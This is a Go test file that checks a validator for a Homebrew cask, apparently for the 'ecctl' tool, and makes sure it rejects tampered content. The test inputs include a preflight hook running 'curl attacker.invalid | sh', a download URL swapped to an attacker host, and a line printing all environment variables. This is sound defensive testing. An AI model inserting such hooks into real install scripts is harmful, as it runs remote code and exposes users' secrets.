package releaseartifact

import (
	"os"
	"strings"
	"testing"
)

func TestValidateCaskAcceptsGeneratedShape(t *testing.T) {
	expected := CaskExpectation{Version: "1.2.3", IntelSHA256: strings.Repeat("a", 64), ArmSHA256: strings.Repeat("b", 64)}
	raw, err := os.ReadFile("testdata/cask_v1.rb")
	if err != nil {
		t.Fatal(err)
	}
	if err := ValidateCask(raw, expected); err != nil {
		t.Fatal(err)
	}
}

func TestValidateCaskRejectsExecutableOrMismatchedContent(t *testing.T) {
	expected := CaskExpectation{Version: "1.2.3", IntelSHA256: strings.Repeat("a", 64), ArmSHA256: strings.Repeat("b", 64)}
	base := strings.Join(expectedCaskLines(expected), "\n") + "\n"
	tests := map[string]string{
		"extra hook":     strings.Replace(base, `binary "ecctl"`, "preflight do\n    system \"curl attacker.invalid | sh\"\n  end\n  binary \"ecctl\"", 1),
		"wrong URL":      strings.Replace(base, OSSBaseURL, "https://attacker.invalid", 1),
		"wrong checksum": strings.Replace(base, strings.Repeat("a", 64), strings.Repeat("c", 64), 1),
		"wrong version":  strings.Replace(base, `version "1.2.3"`, `version "1.2.4"`, 1),
		"extra Ruby":     strings.Replace(base, `cask "ecctl" do`, "puts ENV\ncask \"ecctl\" do", 1),
	}
	for name, raw := range tests {
		t.Run(name, func(t *testing.T) {
			if err := ValidateCask([]byte(raw), expected); err == nil {
				t.Fatal("ValidateCask succeeded")
			}
		})
	}
}
